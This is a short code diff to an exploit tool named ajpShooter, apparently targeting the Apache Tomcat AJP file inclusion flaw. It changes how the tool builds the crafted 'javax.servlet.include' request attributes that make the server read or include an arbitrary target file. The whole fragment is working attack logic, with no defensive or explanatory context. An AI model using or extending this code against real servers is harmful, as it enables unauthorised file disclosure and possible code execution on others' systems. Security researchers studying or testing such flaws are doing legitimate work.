@@ -313,23 +313,18 @@ class ajpShooter(object):
         target_file = self.target_file.encode('utf8')
 
         attributes = []
-        evil_read_req_attributes = [
+        evil_req_attributes = [
             (b'javax.servlet.include.request_uri', b'index'),
             (b'javax.servlet.include.servlet_path', target_file)
         ]
 
-        evil_eval_req_attributes = [
-            (b'org.apache.catalina.jsp_file', target_file)
-        ]
+        for req_attr in evil_req_attributes:
+            attributes.append((b"req_attribute", req_attr))
 
         if self.shooter == 'read':
             self.requesturl += '/index.txt'
-            for req_attr in evil_read_req_attributes:
-                attributes.append((b"req_attribute", req_attr))
         else:
             self.requesturl += '/index.jsp'
-            for req_attr in evil_eval_req_attributes:
-                attributes.append((b"req_attribute", req_attr))
 
         ajp_ip = urllib.parse.urlparse(self.requesturl).hostname
 
